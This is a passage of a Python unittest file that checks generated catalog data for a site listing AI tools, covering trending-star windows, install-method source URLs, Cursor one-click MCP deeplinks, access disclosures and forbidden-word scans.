        old = {datetime.date(2026, 11, 1): {'a/b': {'stars': 10}}, datetime.date(2026, 11, 10): {'a/b': {'stars': 18}}}
        t = BA.trending_for('a/b', 20, old, today)       # ages 11 and 2: no snapshot in the 6-9 day window
        self.assertEqual((t['ready'], t['d7'], t['d30']), (False, None, None))


class RealOutput(unittest.TestCase):
    """Checks over the generated site/public/data files (skipped when they are absent)."""
    OUT = HERE.parent.parent / 'site' / 'public' / 'data'

    def setUp(self):
        if not (self.OUT / 'catalog-ai.json').exists(): self.skipTest('no generated data')

    def details(self):
        for f in sorted((self.OUT / 'ai').glob('*.json')):
            yield json.loads(f.read_text(encoding='utf-8'))

    def test_counts_and_files(self):
        c = json.loads((self.OUT / 'catalog-ai.json').read_text(encoding='utf-8'))
        self.assertEqual(c['count'], len(c['entries']))
        self.assertEqual({e['slug'] for e in c['entries']}, {f.stem for f in (self.OUT / 'ai').glob('*.json')})

    def test_source_urls_literal_in_research_file(self):
        md = (HERE.parent.parent / 'site' / 'research' / 'install_methods.md').read_text(encoding='utf-8')
        # the research file writes '[https://learn.chatgpt.com/docs/extend/mcp?surface=cli]' and only '[?surface=ide]' for the IDE variant
        allowed_extra = {'https://learn.chatgpt.com/docs/extend/mcp?surface=ide'}
        for d in self.details():
            for tool, cell in d['install'].items():
                for ty, m in cell.items():
                    if m['kind'] == 'none': self.assertIsNone(m['source_url']); continue
                    u = m['source_url']
                    self.assertTrue(u in md or u in allowed_extra, u)

    def test_cursor_oneclick_is_npx_stdio(self):
        n = 0
        for d in self.details():
            m = d['install']['cursor'].get('mcp')
            if m and m['kind'] == 'oneclick':
                name, cfg = IA.decode_cursor_deeplink(m['url'])
                self.assertEqual(cfg['command'], 'npx'); n += 1
            for ty, mm in d['install']['cursor'].items():
                if mm['kind'] == 'oneclick': self.assertEqual(ty, 'mcp')
        self.assertGreater(n, 0)

    def test_access_values(self):
        for d in self.details():
            a = d['access']
            self.assertEqual(a['disclaimer'], IA.DISCLAIMER)
            for k in ('files', 'terminal', 'network', 'api_keys'):
                self.assertTrue(isinstance(a[k], str) and a[k], k)
            self.assertTrue(d['readme_excerpt_removed'])
            def _keys(o):
                if isinstance(o, dict):
                    for k, v in o.items():
                        yield k
                        yield from _keys(v)
                elif isinstance(o, list):
                    for v in o: yield from _keys(v)
            # no README text field; only the README LINK (usage.readme_url, abilities/.../readme_url) and the removal flag may exist
            self.assertEqual({k for k in _keys(d) if 'readme' in k.lower()} - {'readme_url', 'readme_excerpt_removed'}, set())

    def test_no_forbidden_words_anywhere(self):
        for f in [self.OUT / 'catalog-ai.json', self.OUT / 'stats-ai.json'] + sorted((self.OUT / 'ai').glob('*.json')):
            self.assertIsNone(BAD.search(f.read_text(encoding='utf-8')), f.name)


if __name__ == '__main__':
    unittest.main(verbosity=1)
